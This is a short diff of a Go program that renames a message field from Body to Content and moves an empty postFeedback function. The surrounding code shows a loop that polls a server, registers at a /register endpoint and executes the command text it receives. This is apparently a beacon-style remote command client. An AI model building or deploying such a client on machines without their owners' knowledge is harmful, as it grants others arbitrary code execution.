@@ -45,7 +45,7 @@ func main() {
 		time.Sleep(5 * time.Second)
 		msg := getMessage()
 		if msg != nil {
-			cmdLine := msg.Body
+			cmdLine := msg.Content
 			if cmdLine != nil {
 				cmd := NewCommand(cmdLine.(string))
 				cmd.Exec()
@@ -75,6 +75,10 @@ func getMessage() *message.Message {
 	return msg
 }
 
+func postFeedback(m *message.Message) {
+
+}
+
 func alive() {
 	url := fmt.Sprintf("%s/register", BaseUrl)
 	data := make(map[string]string)
@@ -89,9 +93,5 @@ func alive() {
 	if err != nil {
 		return
 	}
-	fmt.Println(msg.Body)
-}
-
-func postFeedback(m *message.Message) {
-
+	fmt.Println(msg.Content)
 }
